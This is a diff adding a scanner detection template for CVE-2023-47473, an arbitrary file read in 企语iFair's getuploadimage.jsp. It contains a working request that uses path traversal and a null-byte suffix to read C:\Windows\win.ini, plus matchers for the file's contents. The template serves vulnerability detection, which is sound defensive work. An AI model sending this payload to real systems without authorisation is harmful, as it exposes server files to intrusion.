@@ -1,0 +1,38 @@
+id: cve-2023-47473
+info:
+  name: 企语iFair getuploadimage.jsp 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: CVE-2023-47473,任意文件或目录访问
+  description: |
+    This template detects the 任意文件读取漏洞 (arbitrary file read vulnerability) in the 企语iFair application through the `getuploadimage.jsp` endpoint.
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/oa/common/components/upload/getuploadimage.jsp?imageURL=C:\\Windows\\win.ini%001.png'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "; for 16-bit app support"
+          - "[files]"
+      - type: word
+        part: header
+        words:
+          - "image/jpeg"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+        condition: or
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+        condition: or
